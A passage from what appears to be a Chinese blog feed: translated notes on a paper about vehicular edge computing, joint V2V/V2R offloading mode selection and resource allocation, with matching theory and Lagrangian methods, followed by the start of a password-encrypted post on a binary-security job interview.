服务器或服务车辆。考虑到车辆的移动性，通过选择合适的卸载模式并购买一些合理的卸载资源，可以获得更高的服务质量。以最小化所有任务车辆的平均成本为目标，我们联合优化卸载模式选择和计算资源分配。这项工作的<strong>主要贡献</strong>总结如下：</p><p><strong>1）我们提出了一种有效的模式选择协议，其中车辆可以在多车辆和多服务器网络中为能量有限的车辆或车载用户设备自主选择V2V或V2R卸载模式。</strong></p><p><strong>2）我们考虑车辆的移动性，并定义双向双车道场景中的传输增益，其中传输增益来自于所选服务器与任务车辆之间距离的缩短。此外，RSU服务器和服务车辆采用差异化定价策略，通过向任务车辆出租计算资源来获得收入。</strong></p><p><strong>3）我们通过结合任务车辆的卸载延迟、能源消耗、从RSU服务器或服务车辆购买计算资源的费用以及传输增益，设计了一种新颖的车辆成本指标。我们通过联合优化卸载模式选择和计算资源分配，在允许的延迟和计算能力约束下制定平均成本最小化问题。</strong></p><p><strong>4）基于匹配理论和拉格朗日对偶理论，我们提出了一种分布式迭代算法来解决原始优化问题，将其分为卸载模式选择子问题和资源分配子问题。仿真结果表明，所提出的算法在复杂度和成本方面大大优于基准方案。</strong></p><h2 id="2-相关工作">2.相关工作</h2><p>负载任务作为VEC网络中的一个重要问题，目前受到了广泛的研究。加载策略的计算一般可以分为二元加载[8,21]和部分加载[22]。</p><ul><li>对于二进制卸载，每辆车可以独立决定是在本地计算任务还是将任务卸载到VEC服务器。例如，Nguyen 等人。通过应用二元卸载方案改善车辆服务并减少能源消耗[8]。</li><li>对于部分卸载，输入数据被分为两部分，分别用于本地计算和边缘计算。戴等人。提出了联合负载平衡和部分卸载问题以最大化系统效用[22]。参考文献 1 中提出了一种仅依靠 V2V 通信的加载方案的任务。 [18]通过充分利用聚集车辆的闲置资源来执行任务。</li></ul><p>在上述工作中，车辆通常将其任务卸载到与 RSU 位于同一位置的VEC 服务器。当多辆车辆将任务加载到同一个VEC服务器时，由于VEC服务器的计算能力有限，很难满足车辆用户的延迟QoS要求。如果车辆将任务加载到远程云服务器上，长距离传输将带来沉重的开销。幸运的是，一些具有更强大计算能力的车辆可以充当服务器，承担多车辆和多服务器网络中从相邻车辆加载的任务。例如，张等人。研究了协作加载模式，其中计算资源有限的任务车辆可以将任务加载到提供计算服务的RSU 服务器或服务车辆 [17]。顾等人。使车辆能够将任务卸载给 VEC服务器和具有过多计算资源的车辆 [19]。然而，上述工作没有考虑车辆双向移动性带来的潜在性能增益。**考虑到可用的计算资源和车辆的移动性，我们通过联合考虑 V2R 和 V2V 加载模式以及双向交通中的潜在传输增益，提出了更高效的加载方案。**在这种情况下，任务车辆可以将其任务卸载到 RSU 或附近服务车辆上配备的 VEC 服务器。对于VEC网络中的加载任务，大多数现有工作旨在最小化延迟、能量消耗或费用[9,22-25]。在最大限度地减少延迟方面，Zhang 等人。提出了一种基于软件定义网络（SDN）的负载均衡任务加载方案，以最小化计算任务的处理延迟[23]。然而，更多的文献将延迟和能量消耗一起考虑。李等人。通过构建分层装载模型，共同考虑车辆的延误和成本，以优化装载比例并降低系统消耗[24]。杨等人。共同考虑加载决策、加载时间和计算资源，以最小化通信和计算成本[25]。张等人。联合优化多辆车的卸载比例和上行/计算/下行比特分配，以最小化车辆的总能耗[9]。在上述工作中，仅采用统一定价策略对车辆费用进行建模，即服务器对购买其计算资源的车辆收取相同的单价。在实际应用中，车辆的任务往往不同，车辆与服务器之间的距离也不同。差别定价方案可以获得更大的收入，这使得服务器可以对距离较近的车辆收取更高的价格，从而避免多辆车同时将任务卸载到同一服务器的情况。与现有工作不同的是，我们的目标是通过综合考虑卸载延迟、能源消耗和差别定价费用以及传输增益来最小化所有任务车辆的平均成本。</p><h2 id="3-系统模型">3. 系统模型</h2><h3 id="3-1车辆边缘网络模型">3.1车辆边缘网络模型</h3><p>我们考虑一个具有 M 个 RSU 和 N 个车辆的双向 VEC 网络双车道如图 1 所示，其中 RSU 位于路边。每个 RSU 都配备了一个计算资源有限的 VEC 服务器。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/4.png" alt="4"></p><p>我们假设每辆车在装载和计算过程中以恒定速度移动。</p><p>d i,m(t) 和 d i,j (t) 表示任务车 i 之间的时变距离；</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/5.png" alt="5"></p><blockquote><p>这个是计算i和j之间距离的公式</p></blockquote><p>其中，h 是 RSU 的高度。</p><p>我们考虑信号传播中的大尺度路径损耗和小尺度瑞利衰落效应。由于信道是正交的，相邻车辆之间不存在相互干扰。上行链路传输从 TV i 到 RSU m 的任务率可表示为 r i,m (t) 并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/1.png" alt="1"></p><blockquote><p>δ0为参考距离处大尺度路径损失引起的信道功率增益</p><p>H i,m表示 TV i 和 RSU m 之间小尺度瑞利衰落引起的信道增益</p><p>κ是路径损耗指数</p><p>P是任务车发射功率</p><p>σ2为额外噪声的功率</p><p>B为信道带宽（B*log应该是）</p></blockquote><p>类似地，从 TV i 到 SV j 的上行链路传输速率可以表示为 r i,j(t) 并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/2.png" alt="2"></p><p>定义x i,m 和m作为从 TV i 到 RSU 服务器 m的卸载决策。有如下约束</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/3.png" alt="3"></p><p>所有TV（任务车）都需要根据自己的业务需求选择合适的加载模式。卸载方式的选择可以直接影响服务器的卸载时延、能耗和费用。接下来我们详细分析以下两种加载模式。</p><h3 id="3-2-卸载模型">3.2.卸载模型</h3><h4 id="3-2-1-V2R卸载模式">3.2.1. V2R卸载模式</h4><p>当TV i决定将其任务卸载到RSU m时，TV i的任务加载延迟可以分为两部分：</p><ul><li>卸载任务的上行传输时间</li><li>卸载任务的计算时间关联的 RSU服务器</li></ul><p>将t up i;m 表示为将任务从TV i 卸载到RSU 服务器m 的无线传输延迟，</p><p>将t exe i;m 表示为计算时间。</p><p>给定 TV i 和 RSU 服务器 m 。r i,m 之间的上行传输速率和车辆 i</p><p>R i 的任务大小，传输时间t up i;m 可以根据以下方程计算。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/7-1709029412731.png" alt="7"></p><p>其中 f R i;m 是 RSU 服务器 m 分配给 TV i 的计算资源。由于许多应用的计算输出数据的大小远小于计算输入数据的大小，并且下载数据速率非常高，因此下行链路过程的传输延迟和能量消耗可以忽略不计[26]。因此，V2R 模式的卸载延迟由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/8.png" alt="8"></p><p>类似地，当TV i向RSU服务器m卸载任务时，TV i完成任务的总能耗包括TV i的传输能耗和RSU服务器m的计算能耗。完成电视 i 的任务的总能量成本用 E i,m 表示，可以计算为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/9.png" alt="9"></p><p>其中 γ m 是 RSU 服务器 m 的开关电容常数。卸载过程中TV需要购买计算来自 RSU 服务器的资源。我们将μ i,m 表示为价格单位TV i 从 RSU 服务器 m 购买的计算资源。 RSU 服务器 m 收取的TV i 的卸载费用用 e i,m 表示，并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/10.png" alt="10"></p><h4 id="3-2-2-V2V卸载模式">3.2.2. V2V卸载模式</h4><p>当TV i向SV服务器j卸载任务时，TV i的任务加载时延也可以分为两部分：</p><ul><li>向SV服务器j卸载任务的上行传输时间</li><li>SV 服务器 j 的计算时间</li></ul><p>将t up i;j 表示为将任务从TV i 卸载到SV j 的无线传输时间成本</p><p>将t exe i;j 表示为SV 服务器j 处的计算时间。</p><p>给定 r i,j 和Ri ，可以通过求解以下方程获得传输时间 t up i;j</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/6.png" alt="6"></p><p>其中 f S i;j 是分配给 TV i 的 SV j 的计算资源。因此，V2V模式的卸载延迟由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/11.png" alt="11"></p><p>当TV i将任务卸载给SV j时，TV i加载完成任务的能量还包括传输能量和计算能量。 TV i 卸载任务的传输能量成本可以计算为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/12.png" alt="12"></p><p>其中 γ j 是 SV j 的开关电容常数。我们将 Delta i,j 表示为SV j 收取的 TV i 计算资源的单价。由于RSU的接入服务是由一些运营商提供的，并且V2V通信总是由移动车辆自组织[13]，因此可以合理地假设V2V加载模式场外计算资源的价格单位远小于V2R加载模式</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/13.png" alt="13"></p><p>非统一定价机制由VEC服务器（即RSU服务器或SV服务器）应用。这意味着VEC服务器可以向电视收取不同的计算资源单价。这样可以鼓励每台TV选择单价较低的服务器来执行加载任务，以减少购买计算资源的费用。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/17.png" alt="17"></p><h4 id="3-2-3-传输增益">3.2.3.传输增益</h4><p>为了更好地研究传输增益对成本的影响，我们将其视为平均成本的单独部分。当TV加载其当任务分配给逐渐靠近电视的 SV 或 RSU 服务器时，上行链路传输速率将随着电视与其目标服务器之间距离的缩短而增加。存在三种情况：</p><ul><li>TV 及其选择的 SV 在不同车道上行驶。当TV和选定的 SV 靠近时，它们的距离会变短。</li><li>电视及其选择的 SV 在同一车道上行驶。如果TV/SV以较高的速度追赶SV/TV，则TV与SV之间的距离会变短，即快车追慢车。</li><li>当TV选择其行驶方向上的前向RSU服务器时，TV与RSU服务器之间的距离也变短。</li></ul><p>在上述情况下，瞬时传输速率可能远高于全局平均速率，同一时间内可以传输更多的任务。因此，传输增益被定义为以瞬时速率传输的比特数与以平均速率传输的比特数之间的差。我们将 V2R 和 V2V 加载模式下产生的传输增益分别表示为 g i,m 和 g i,j ，分别表示为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/14.png" alt="14"></p><p>其中ri;m和ri;j分别表示V2R和V2V加载模式下上行传输的平均速率，即</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/15.png" alt="15"></p><p>电视倾向于选择距离逐渐缩短的目标VEC服务器，因为缩短的距离可以提高瞬时传输速率和传输增益。需要注意的是，当电视遇到关联的VEC服务器后，它们之间的距离会逐渐增大。在这种情况下，如果任务没有完全卸载，并且瞬时传输速率低于平均传输速率，则累积的传输增益将逐渐被抵消。</p><h4 id="3-2-4-成本函数">3.2.4.成本函数</h4><p>由于VEC服务器计算资源的限制，当多辆车辆选择同一个VEC服务器来卸载其任务时，卸载策略可能效率较低并导致过载。因此，每辆车应选择合适的卸载模式并购买合适的计算资源，以降低系统成本。我们综合考虑卸载时延和能耗、服务器费用以及传输增益，构建了综合成本函数。电视 i 的成本为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/16.png" alt="16"></p><p>其中，ωl和ωe分别表示卸载延迟和卸载的权重能量，分别。 Ti 是完成 TV i 已卸载任务的延迟。 E i 是电视 i 完成卸载任务的总能耗。 e i 是完成 TV i 的卸载任务的费用。它们可以表达如下</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/18.png" alt="18"></p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/19.png" alt="19"></p><h2 id="4-问题表述">4. 问题表述</h2><p>我们的目标是通过联合优化卸载关联和计算资源分配来最小化所有电视的总成本。成本最小化问题可以表示为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/20.png" alt="20"></p><p>约束C 1 保证任务处理延迟不能超过最大允许延迟T max。</p><p>约束C 2 和C 3 确保分配给所有TV的总计算资源不超过RSU服务器或SV的总计算能力。</p><p>约束 C 4 、C5 和 C 6 确保每辆车仅将其任务加载给一个 RSU 或 SV。</p><p>约束 C 7 确保与同一 SV 关联的 TV 数量不能超过给定阈值 Q。</p><p>解决上述优化问题 P 1 的主要难点是整数变量 x i,m 1/4 {0, 1}和 y i,j 1/4 {0, 1} 以及连续变量 f R i;m 和 f S i;j 的相互影响，这使得优化问题 P 1 成为混合整数非线性规划问题，通常是非凸的并且难以在多项式时间内求解[27]。为了解决这个问题，我们将原问题分解为两个子问题，即模式选择子问题和资源分配子问题，然后提出一种低复杂度的分布式迭代算法。</p><h2 id="5-建议的解决方案">5. 建议的解决方案</h2><p>本节应用匹配理论求解模式选择子问题，应用拉格朗日对偶方法求解资源分配子问题。</p><h3 id="5-1-模式选择子问题的求解">5.1.模式选择子问题的求解</h3><p>当给定资源分配矩阵F R 和F S 时，P 1 可以变换为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/21.png" alt="21"></p><p>在 P 2 中，所有变量 x i,m 、y i,j 都是二元变量，而目标函数相对于 x i,m 和 y i,j 是非线性的。这也是一个整数非线性规划问题。</p><p>为了最大限度地降低网络中所有TV的平均成本，那些对计算、通信和延迟要求较高的电视应匹配适当的服务器。匹配理论是研究两组主体之间互利关系形成的一种低复杂度的有用技术[19]。每个代理都有自己的偏好，并使用取决于一些可测量参数的效用函数对相反集合中的代理进行排名。电视根据基于匹配理论生成的偏好列表来做出卸载模式选择的决策，以最小化其成本[28]。此外，匹配决策是由代理本身根据本地收集的信息交互式地做出的。因此，基于匹配理论的协议不需要任何集中协调器，并且可以提高可扩展性。受上述观察的启发，我们提出了一种匹配算法，通过利用电视和 SV 之间的一对一匹配以及 RSU 服务器和电视之间的一对多匹配来查找电视和 VEC 服务器之间的匹配关系。负载模式选择匹配的定义如定义1所示。</p><p>定义1.（卸载模式选择匹配）</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/22.png" alt="22"></p><p>此外，还利用一对一匹配和一对多匹配来解决加载问题的计算。具体来说，电视和SV之间采用一对一匹配，其中一台TV只能将其任务卸载给一台SV，而一台SV只能为一台TV服务。此外，我们在RSU服务器和电视之间应用一对多匹配，其中一台RSU服务器可以为多台TV提供服务。为了解决基于匹配理论的优化问题P 2 ，我们首先需要分别设计TV、RSU服务器和SV的偏好函数和偏好列表。</p><h4 id="5-1-1-TV偏好">5.1.1.TV偏好</h4><p>为了执行匹配方法，每台TV都需要建立其偏好列表。为了满足QoS 要求，电视更喜欢与可以提供更短延迟、更低能耗和更少费用的RSU 或 SV 关联。由此，我们将卸载时延、能耗、服务器费用、传输增益之和的倒数定义为电视i的偏好函数φT i，得到偏好列表TV i 的 L Ti 按函数值降序排列。 TV i 对 RSU 或 SV 的偏好函数为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/23.png" alt="23"></p><h4 id="5-1-2-RSU-或-SV-的偏好">5.1.2. RSU 或 SV 的偏好</h4><p>为了获得更高的收入，RSU和SV更愿意接受能够带来更高收入的用户的请求。因此，我们将RSU m 和SV j 的收益作为它们的偏好函数ÏRm 和ÏS j ，并根据函数值的递减顺序确定偏好列表L R m 和LS j 。RSU 服务器 m 和 SV j 对电视的偏好函数如下</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/25.png" alt="25"></p><p>匹配以迭代方式实现。仍然不匹配的 TV i 将向其最优选的 RSU 服务器和 L T i 中的 SV 发送匹配请求。如果RSU服务器m或SV j仅接收到一个请求，则将构造匹配。如果RSU服务器m或SV j 接收到多个请求，则RSU服务器m和SV j 将反转选择以根据偏好列表L R m 和LS j 构建匹配。已建立匹配关系的 RSU 服务器和 SV 将从所有尚未选择的电视的偏好列表中删除。当所有电视都建立了匹配关系并且没有被任何配对阻挡时，匹配过程将稳定并结束。阻塞对和稳定匹配的定义在下面的定义2和3中给出。</p><blockquote><p>Definition 2. (blocking pair). TV i and RSU server m or SV j form a blocking pair if both the TV and server prefer the others than their currently matched results.</p></blockquote><p>如果 TV 和服务器都更喜欢其他结果而不是其当前匹配的结果，则 TV i 和 RSU 服务器 m 或 SV j 相互阻塞。</p><blockquote><p>Definition 3. (stable matching). A matching Φ is stable if it is not blocked by any pair.</p></blockquote><h4 id="5-1-3-迭代匹配">5.1.3.迭代匹配</h4><p>由于车辆的卸载决策相互影响，所以得到的匹配结果在开始时并不稳定。因此，为了获得稳定的匹配结果，我们采用迭代匹配</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/26.png" alt="26"></p><p>正如定义 4 中所示，迭代匹配为 TV i 提供了改变其合作伙伴的机会。然而，当且仅当迭代匹配得到服务器认可时，迭代匹配才是有效的，并且当迭代匹配能够提高其效用时，服务器才会认可迭代匹配。迭代匹配与传统匹配的区别主要在于匹配过程中更新偏好列表的方式。具体来说，根据参考文献中所示的匹配理论。 [28]，在传统的匹配算法中，偏好函数在匹配过程中保持不变，并且仅通过删除已经成功匹配的代理来更新偏好列表。对于迭代匹配，如参考文献所示。[30]，偏好函数可以在每轮匹配中更新，然后根据当前匹配结果和资源分配结果重建偏好列表。</p><p>现在，我们提出了一种基于匹配理论的模式选择算法来获得最佳匹配策略</p><p>Φ*详细信息如算法1所示。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/24.png" alt="24"></p><h3 id="5-2-资源分配子问题的求解">5.2.资源分配子问题的求解</h3><p>当模式选择决策x和y确定后，P 1 可以转化为如下所示的资源分配子问题P 3</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/27.png" alt="27"></p><blockquote><p>定义 5. 假设 f (x)是两次可微的。那么 f（x）是凸的当且仅当 dom f 是凸的并且 f(x) 的 Hessian 矩阵对于所有 x ∈ dom f 都是正半定 (PSD)，即</p></blockquote><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/28.png" alt="28"></p><p>可以证明中的P 3是凸优化问题。</p><p>根据定义 5，U i 就变量 f R i;m 和 fS i;j 而言是凹的。另外，由于约束条件C 1 ～C3 也是线性且凸的，因此证明(30)中的P 3是凸优化问题。</p><p>仿真参数如下表所示</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/29.png" alt="29"></p><p>如果原问题是凸问题，则对偶函数的最优解等于其自身的最优解。为了获得低复杂度的等效最优解，采用拉格朗日方法来求解该问题。拉格朗日函数是</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/30.png" alt="30"></p><p>其中，α、β 和 α 是拉格朗日乘数的向量。这拉格朗日对偶函数由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/31.png" alt="31"></p><p>根据Karush-Kuhn-Tucker（KKT）条件[31]，我们可以得到变量的表达式。我们取 L 对 f R i;m 和 fS i;j 的一阶导数，并令它们等于 0。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/32.png" alt="32"></p><p>则可得到f R i;m 和f S 的最优解表达式可以根据附录A中给出的(34)~(43)计算。由于拉格朗日函数是可微的，因此拉格朗日乘子的梯度可以得到为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/34.png" alt="34"></p><p>其中</p><p>Δαi，Δβk，Δρj&gt; 0 是梯度步长，t d 是拉格朗日乘子的迭代次数</p><p>拉格朗日方法的详细信息如算法 2 所示</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/37.png" alt="37"></p><blockquote></blockquote><h3 id="5-3-联合模式选择和资源分配优化解决方案">5.3.联合模式选择和资源分配优化解决方案</h3><p>为了求解P 1 ，我们提出了一种联合考虑模式选择和资源分配的分布式迭代算法，其总结在算法3中。P 1 可以以分布式方式求解。特别地，我们将 P 1 分解为模式选择和资源分配子问题。首先，基于给定的F R 和F S ，每辆车利用匹配理论获得其模式选择决策X和Y。然后，在得到的模式选择决策下，各车辆利用拉格朗日乘子法求得F R 和F S，重复上述过程直至收敛。整个算法由匹配过程和拉格朗日对偶过程组成。我们将外层循环的迭代次数设置为N 3 ，并将匹配循环和拉格朗日双循环的迭代次数分别设置为N 1 和N 2 。具体来说，在每次内循环迭代中，车辆根据拉格朗日乘数是否收敛的判断标准做出选择决策。当内循环收敛时，外循环开始。匹配过程的复杂性包括以下几个方面：</p><p>1）车辆建立偏好列表并发起匹配邀请复杂度为O（I*(J+M)）</p><p>2）VEC服务器发起匹配过程，复杂度为O(I+J+M)。因此，匹配过程的复杂度为O(N1(I*(J+M)+(I+J+M)))。拉格朗日过程的<strong>复杂度</strong>主要由<strong>资源分配</strong>和<strong>拉格朗日乘子迭代过程</strong>组成，因此其复杂度为O(N2(I+J+M+I *(J+M)))。因此，对于 N 3 次迭代，我们提出的分布式算法的计算复杂度可以表示为O(N3[(N1(I *(J+M)+(I+J+M)))+(N2(I+J+M+I *(J+M)))])</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/38.png" alt="38"></p><p>为了在实践中实现所提出的分布式算法，我们使用算法1来确定电视和目标服务器之间的匹配关系，然后使用算法2来确定资源分配。首先，每辆车广播其位置信息并计算车辆之间的距离以更新距离矩阵。由于信道是正交的，车辆之间不存在干扰，只存在高斯白噪声。因此，我们建立了电视和VEC服务器之间的传输速率矩阵。同时，每台电视根据偏好函数建立自己的偏好列表，并向列表中的第一个服务器发送匹配请求。当所有电视发送匹配请求后，如果服务器只收到一个匹配请求，则服务器将与发送他请求的电视形成匹配对。如果一台服务器收到来自多辆车的多个请求，它将选择能够最大化其收入的电视进行匹配。然后，我们使用算法2来确定如何分配资源。两种算法迭代直至收敛。</p><h2 id="6-绩效评估">6. 绩效评估</h2><h3 id="6-1-模拟设置">6.1.模拟设置</h3><p>我们考虑位于双向双车道的车辆网络长度500m。车辆随机分布在该区域。每个SV允许服务的车辆数量阈值是Q×1。表1总结了通信参数。我们考虑计算密集型任务，例如智能导航、道路安全相关交通、娱乐应用等。这些任务对计算资源和处理延迟有不同的要求。我们用 fR i 表示任务的特征； C i ;最大温度</p><p>g 分别描述任务数据大小、计算资源需求和截止时间约束。不失一般性，在模拟中，电视的计算任务根据其数据大小、计算资源要求和延迟约束的特点随机分配。具体来说，生成的任务大小在[100, 2000] KB范围内随机分布，计算资源需求在[0.5,10] GHz范围内，最大延迟约束在[0.5, 2.5] s范围内。我们将我们提出的加载方案与以下三个基准方案进行比较：</p><ol><li>Only V2R模式方案:在TVs上生成的任务全部卸载到最近的RSU服务器上。</li></ol><p>2）基于距离的选择方案：TV生成的任务可以卸载到RSU服务器或SV，并且仅根据距离选择目标服务器。</p><p>3）仅V2V模式方案：TV处生成的任务全部卸载到最近的SV。</p><h3 id="6-2-收敛性能">6.2.收敛性能</h3><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/33.png" alt="33"></p><p>这图是收敛表现：不同的迭代次数时任务车的平均开销</p><p>在图2中，所提出方案的收敛性能以网络中不同电视数量（分别为3、5、10和15）下所有电视的平均成本来说明。从图2中，我们可以看到所提出的方案收敛得很快。经过五次或六次迭代后，不同电视数量下所有电视的平均成本很快收敛，这也意味着所提出的算法具有相对较低的复杂度。另外，从图2可以看出，随着电视数量的增加，电视的平均成本也随之增加。原因是所有VEC服务器的计算资源都是有限的。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/35.png" alt="35"></p><blockquote><p>可以看到改进算法比仅 V2V模式的开销是低一点的</p></blockquote><p>图 3 显示了电视的平均成本与TV数量的关系。为了完成评估，我们在模拟具有 10 个 SV 和 15 个 RSU 服务器的电视的平均成本时选择了不同数量的电视（即 5、10、15、20、25、30、35）。我们可以看到，电视数量越多，电视的平均成本就越高。这是因为，RSU服务器和SV的计算资源是有限的，当电视越多时，分配给每个关联电视的计算资源就越少。此外，我们提出的方案实现的电视平均成本是最低的，这意味着我们提出的方案大大优于现有方案。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/36.png" alt="36"></p><blockquote><p>四种方案下SV数量的影响</p></blockquote><p>图 4 显示了电视的平均成本与 SV 数量的关系。我们使用 15 台电视和 10 个 RSU 服务器来模拟具有不同数量 SV（即 5、10、15、20、25、30、35）的电视的平均成本。我们可以看到，随着 SV 数量的增加，所有方案的性能都会提高，因为更多的 SV 为电视之间的加载任务提供了更好的机会。相反，SV 的数量对仅 V2R 模式方案的性能影响较小，其中任务全部卸载到 RSU 服务器。给定相同的 SV 集，我们提出的方案的性能比基准方案的性能要好得多。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/39.png" alt="39"></p><p>图 5 显示了计算 [200,1000] 范围内的每一位所需的 CPU 周期对 10 台电视、5 台电视的平均成本的影响SV 和 5 个 RSU 服务器。当计算每一位所需的 CPU 周期增加时，四种加载方案的电视平均成本也会增加。原因是，电视需要购买更多的计算资源来计算其任务，这会导致更大的延迟、能耗和费用。从曲线变化程度来看，也说明我们的方案具有更好的稳定性。</p><p>为了研究延迟权重对电视平均成本的影响，我们模拟了图6中不同权重下的结果。可以看出，在延迟权重下，电视的平均成本随着延迟权重的增加而增加。提出的方案，而曲线的斜率代表全网延迟。相反，基准方案的电视平均成本有所下降。我们提出的方案在不同的时间延迟和能耗权重下始终优于基准方案。我们提出的方案的曲线斜率低于其他基线的曲线斜率，这验证了我们提出的算法的鲁棒性。</p><p>此外，我们还在图7中研究了权重变化对延迟和能耗的影响。随着延迟权重的增加，电视的平均延迟降低，电视的平均能耗增加，如图7所示。原因在于，如果电视的延迟权重增大，则延迟对电视平均成本的贡献就越大，并且在车辆成本最小化的情况下，电视的平均延迟呈现下降趋势。能耗权重的降低意味着能耗对电视平均成本的贡献变小，平均能耗呈现增加趋势。此外，电视的低延迟是以能源消耗和负载成本为代价的。本文中，我们设定一个SV只能为一台电视提供加载服务，即Q=1。为了分析Q值的变化对电视平均成本的影响，我们模拟了这种变化当Q &gt; 1时该方案的效果。</p><p>图8评估了SV可以服务的最大电视数量对电视平均成本的影响。我们可以观察到电视平均成本呈增加趋势，并且当Q=1时最低。这是因为，当Q的数量增加时，每个SV可以服务的TV数量增加，分配给每个TV的计算资源减少。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/40.png" alt="40"></p><p>我们还在图 9(a) 和图 9(b) 中研究了总成本以及延迟、能耗和开销的变化。当Q增加时，所提出方案的平均成本增加，类似于图8。此外，当Q增加时，所提出方案的卸载延迟增加。相反，所提出的方案的卸货能耗和卸货费用减少了。这是因为SV的计算资源是有限的，而TV更愿意花更多的钱购买更多的计算资源来将其任务卸载到RSU服务器。这也是图8中趋势不明显的原因。</p><h2 id="7-结论">7.结论</h2><p>在本文中，我们联合优化了VEC网络中的负载计算和资源分配，并考虑车辆的移动性提出了一种高效的卸载方案。通过结合考虑模式选择和资源分配以及差异定价，我们的优化问题在计算任务的延迟和计算资源约束下最小化电视的平均成本。通过将问题分解为两个子问题，利用匹配理论解决模式选择子问题，利用拉格朗日方法解决资源分配子问题。最后，我们提出了一种分布式迭代算法来解决原始优化问题。仿真结果证明，与三种基准加载方案相比，我们提出的方案始终能够实现所有TV的平均成本较低。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VEC</tag>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制求职面试</title>
    <link href="/2024/02/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%9D%A2%E8%AF%95/"/>
    <url>/2024/02/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%9D%A2%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="777ca6ff71b3d37ee64562c70e11e6d1adb0daaef45f91acdca2569651b4bc6d">6d48864991901107494efd2d96d51f6f508cef7b87454df798ee8a54f80fe92a2a0fb21bc05e6d16d4d39b15d8fa8919b18de667992d97c9eed1c36880ede770bb69b59538481b8499a3f338b4d81755f6d903764425b7a46dc4a8115acc7e8b9672053ab943a9f06f48ffabaa6fb8aca0f52cfaf013a98f63a29b4e5c66dabeee4c3a4eea1f9d72c601812c7cf286731494675f26fdfdbc4345766074221debe92ba3509f55992c4173afb7b0eab036ac07773f6287764a206540e7bab5e346f91fd838979db0700591a2fcd8e9630727b3d8be6ac7a58a814dc5c9a13d11ddef5ba5c59a2876fad182a1aaf88fa9d9d095478dde4d3cd5a0669124e367215eba851703433090c8cef90af75216bdb668ac1b3bfad1fbe7c8f4312d0619206d562ac0a56e52bccd7774a1be6978751e0719d5c7cd753dc7f7f65baf56bfa5c1e64cd8732cdca34c47acc5aa66a3e683bdbe723b579c26e520aff1022309428da193735deaf11932e0da5f74922ad7598638ae777ad5dbb416beb7b0f93ff1025c939307bfabe2e0f0c38bfe1c6175403cbf2064e5a747781dca72414a0647f22c45f7a83f27c491290e5c8d41dc2d73227e5d8175bcbfd9d2bc194ea7ef6184061f048a399a5f596a3ffbc1c672e87b42eed4cba877036115b4a4c0e386a261d7a4468fae9814e74dc38ff3264f1f27802be39f2c0762995938afb245b03edcee9a4ae818bdbed78ef4d767e2764a3231a50f89d82465f5bea0b99821cc53d74b71185f788227e349ea970660060bf932227bac995027533f93961b1dad8e5dd7d63cbbe2b3e7b4c335a89d28d5e756d2a625379901e99e894cd4d9c5248851fa5aead9ee1f701aa7ace340181738d4294320fb9b01b63eccee0a540b8ae52c5881e37959a6d99fe4f44374ddc3fd1c8e9e239e7e541e756176356bd079617e54e006cd04fed038e61d8e259a0a11ccab7cdad1e01d9e3a2c6fad2ab913ee890db7f54d44297b280c1a00e2b407fbd8294b879dd3e55f358226e6749c1d456f67c422c29ce1b1138aacb843f908daee9e7078f407fe70bcb9dce40f3dae79387699f38daa556f9b2c77be8a7bbf195a29ed87baa884eb565a66ca228f50d0ea17b9849c3ac2ee241b58affecaee27b9b03083aa4c4915c0a2bcb41a7825bd1c0c1fe611cd2df5427cdf634f80c9cfe9261790b64676a07bdb6f4e65b4d75338aadcc4d1363568497f55e30ac10b999c2c406e1d9ffec7d85b3081bf672daa20d2639dc9385a5dd1ecce9897d7b8086e99001c4deb82b91749afc27f5a84df24680c3047a344a0e7fa7ba359dc804971283f429d75f487d7123a